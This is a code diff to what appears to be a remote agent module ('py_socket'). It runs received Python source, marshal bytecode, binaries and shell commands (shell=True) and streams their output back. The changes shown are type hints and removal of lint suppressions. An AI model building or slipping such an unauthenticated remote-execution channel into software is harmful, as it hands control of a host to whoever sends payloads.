@@ -7,6 +7,7 @@ import subprocess
 import sys
 import tempfile
 from contextlib import suppress
+from typing import IO
 
 CH_STDOUT: int = 1
 CH_STDERR: int = 2
@@ -34,8 +35,7 @@ def encode_base64(data: bytes) -> str:
 def store_file(data: bytes, target_path: str = "") -> str:
     if not target_path:
         content_hash = hash_value(data)
-        ext = ".exe" if sys.platform == "win32" and data.startswith(b"MZ") else (".bat" if sys.platform == "win32" else ".temp")
-        target_path = os.path.join(tempfile.gettempdir(), f"{content_hash}{ext}")
+        target_path = os.path.join(tempfile.gettempdir(), content_hash)
 
     with open(target_path, "wb") as fh:
         fh.write(data)
@@ -51,7 +51,7 @@ def remove_file(target_path: str) -> None:
 def execute_source(code: str, filename: str = "<remote_payload>", scope: dict[str, object] | None = None) -> None:
     try:
         compiled = compile(code, filename, "exec")
-        exec(compiled, scope if scope is not None else globals())  # noqa: S102
+        exec(compiled, scope if scope is not None else globals())
     except (Exception, SystemExit) as exc:
         print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)
 
@@ -59,7 +59,7 @@ def execute_source(code: str, filename: str = "<remote_payload>", scope: dict[st
 def execute_bytecode(data: bytes, scope: dict[str, object] | None = None) -> None:
     try:
         code_obj = marshal.loads(data)
-        exec(code_obj, scope if scope is not None else globals())  # noqa: S102
+        exec(code_obj, scope if scope is not None else globals())
     except (Exception, SystemExit) as exc:
         print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)
 
@@ -68,7 +68,7 @@ def execute_binary(filepath: str, *args: str, cleanup: bool = False) -> None:
     try:
         os.chmod(filepath, 0o700)
 
-        proc = subprocess.Popen([filepath, *args], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S603
+        proc = subprocess.Popen([filepath, *args], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         send_fn = globals().get("_send_frame")
 
         while proc.stdout:
@@ -89,8 +89,8 @@ def execute_binary(filepath: str, *args: str, cleanup: bool = False) -> None:
             remove_file(filepath)
 
 
-def execute_system_command(command: str, output_buffer: object | None = None) -> None:
-    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S602
+def execute_system_command(command: str, output_buffer: IO[bytes] | None = None) -> None:
+    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     send_fn = globals().get("_send_frame")
 
     while proc.stdout:
@@ -120,7 +120,7 @@ def label(title: str, content: str = "") -> None:
         print(content)
 
 
-def format_table(headers: list, rows: list) -> str:
+def format_table(headers: list[str], rows: list[list[str]]) -> str:
     all_rows = [headers] + [list(row) for row in rows]
     col_widths = [max(len(str(row[i])) for row in all_rows if i < len(row)) for i in range(len(headers))]
 
@@ -133,7 +133,7 @@ def format_table(headers: list, rows: list) -> str:
     return "\n".join(lines)
 
 
-def get_system_summary() -> dict:
+def get_system_summary() -> dict[str, str | int]:
     return {
         "platform": platform.system(),
         "architecture": platform.machine(),
